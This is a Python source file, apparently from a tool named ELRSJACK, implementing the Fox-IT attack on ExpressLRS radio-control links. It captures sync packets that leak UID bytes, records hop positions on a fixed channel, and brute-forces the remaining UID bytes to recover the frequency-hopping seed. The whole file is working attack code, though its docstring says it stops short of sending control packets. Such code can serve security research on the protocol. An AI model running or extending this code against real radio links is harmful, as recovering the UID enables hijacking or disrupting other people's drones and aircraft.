"""Sync-packet capture and UID recovery (the Fox-IT ExpressLRS attack).

Attack summary (published by Fox-IT/NCC Group, 2022, ExpressLRS 1.x/2.x;
partial mitigations landed later but the leak of UID4/UID5 in every sync
packet remains in current OTA4/OTA8):

  1. One sync packet discloses UID[4] and UID[5] in the clear.  The CRC is
     initialised from those same bytes, so the packet self-validates.
  2. The FHSS sequence is seeded from UID[2..5].  With UID4/UID5 known, only
     UID[2] and UID[3] are unknown -- 65536 candidates.
  3. Staying tuned to one fixed (non-sync) channel and recording which packet
     offsets relative to the sync packet land on that channel reveals positions
     in the 256-entry sequence.  Brute-forcing the two unknown UID bytes and
     checking those positions recovers the full FHSS seed.

ELRSJACK stops at UID recovery and optional binding-phrase recovery.  It never
generates RCDATA/channel packets.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field

from . import crypto, fhss, ota


@dataclass
class SyncObservation:
    uid4: int
    uid5: int
    sync_index: int
    channel: int
    rssi_dbm: int | None = None
    rate: str = "100Hz"
    seen_at: float = field(default_factory=time.monotonic)


@dataclass
class ChannelObservation:
    """Packets heard on one fixed channel, as offsets from the sync index."""
    channel: int
    uid4: int
    uid5: int
    sync_index: int
    offsets: list[int] = field(default_factory=list)


@dataclass
class RecoveryResult:
    uid: bytes | None
    candidates: int
    observations_used: int
    method: str
    confirmed: bool
    candidate_uids: list[bytes] | None = None


class CaptureEngine:
    """Accumulates observations and recovers the FHSS seed / UID tail."""

    def __init__(self, domain_name: str = "FCC915", ota_version: int = crypto.OTA_VERSION_ID):
        if domain_name not in fhss.DOMAINS:
            raise ValueError("unknown domain: " + domain_name)
        self.domain = fhss.DOMAINS[domain_name]
        self.ota_version = ota_version
        self.sync_obs: list[SyncObservation] = []
        self.channel_obs: list[ChannelObservation] = []
        self.raw_packets = 0
        self.valid_sync_packets = 0

    def feed_packet(self, packet: bytes, channel: int, rssi_dbm: int | None = None,
                    rate: str = "100Hz") -> ota.SyncPacket | None:
        """Feed one raw LoRa payload.  Returns a validated sync packet or None."""
        self.raw_packets += 1
        sync = ota.parse_sync(packet, channel=channel, rssi_dbm=rssi_dbm)
        if sync is None:
            return None
        self.valid_sync_packets += 1
        self.sync_obs.append(SyncObservation(
            uid4=sync.uid4, uid5=sync.uid5,
            sync_index=sync.fhss_index, channel=channel,
            rssi_dbm=rssi_dbm, rate=rate,
        ))
        return sync

    def add_channel_sample(self, channel: int, uid4: int, uid5: int,
                           sync_index: int, offset: int):
        """Record that a packet was heard on `channel` at `sync_index + offset`."""
        for obs in self.channel_obs:
            if (obs.channel == channel and obs.uid4 == uid4 and obs.uid5 == uid5
                    and obs.sync_index == sync_index):
                if offset not in obs.offsets:
                    obs.offsets.append(offset)
                return
        self.channel_obs.append(ChannelObservation(
            channel=channel, uid4=uid4, uid5=uid5,
            sync_index=sync_index, offsets=[offset],
        ))

    def recover_uid(self) -> RecoveryResult:
        """Brute-force UID[2]/UID[3] against the observed hop positions."""
        if not self.sync_obs:
            return RecoveryResult(None, 0, 0, "none", False, [])

        # Group by UID tail; use the most-observed tail.
        groups: dict[tuple[int, int], list[SyncObservation]] = {}
        for obs in self.sync_obs:
            groups.setdefault((obs.uid4, obs.uid5), []).append(obs)
        (uid4, uid5), observations = max(groups.items(), key=lambda kv: len(kv[1]))
        sync_index = max(observations, key=lambda o: len(self.channel_obs)).sync_index \
            if self.channel_obs else observations[-1].sync_index

        relevant = [o for o in self.channel_obs
                    if o.uid4 == uid4 and o.uid5 == uid5]
        if not relevant:
            return RecoveryResult(None, 0, 0, "sync-only", False, [])

        # Positions in the 256-entry sequence that must map to each channel.
        # FHSS sequences store channel INDEXES, so convert observed Hz -> index.
        constraints: list[tuple[int, int]] = []
        for obs in relevant:
            chan_index = self.domain.channel_index(obs.channel)
            for offset in obs.offsets:
                pos = (obs.sync_index + offset) % self.domain.sequence_len
                constraints.append((pos, chan_index))

        matches: list[bytes] = []
        for uid2 in range(256):
            for uid3 in range(256):
                uid = bytes([0, 0, uid2, uid3, uid4, uid5])
                seed = crypto.uid_seed(uid, self.ota_version)
                seq = fhss.build_sequence(seed, self.domain)
                if all(seq[pos] == channel for pos, channel in constraints):
                    matches.append(uid)
                    if len(matches) >= 8:  # enough to stop; more means ambiguous
                        break
            if len(matches) >= 8:
                break

        # The ELRS LCG discards the top bit of the seed, so UID[2] bit 7 is
        # frequently ambiguous (two candidates differing by 0x80).  Report
        # this honestly; the wordlist cracker can disambiguate by matching the
        # full MD5 UID.
        confirmed = len(matches) == 1
        return RecoveryResult(
            uid=matches[0] if confirmed else None,
            candidates=len(matches),
            observations_used=len(constraints),
            method="fhss-bruteforce",
            confirmed=confirmed,
            candidate_uids=matches,
        )

    def snapshot(self) -> dict:
        return {
            "domain": self.domain.name,
            "sync_channel_hz": fhss.sync_frequency(self.domain),
            "raw_packets": self.raw_packets,
            "valid_sync_packets": self.valid_sync_packets,
            "sync_observations": len(self.sync_obs),
            "channel_observations": len(self.channel_obs),
            "last_uid_tail": (self.sync_obs[-1].uid4, self.sync_obs[-1].uid5)
            if self.sync_obs else None,
        }
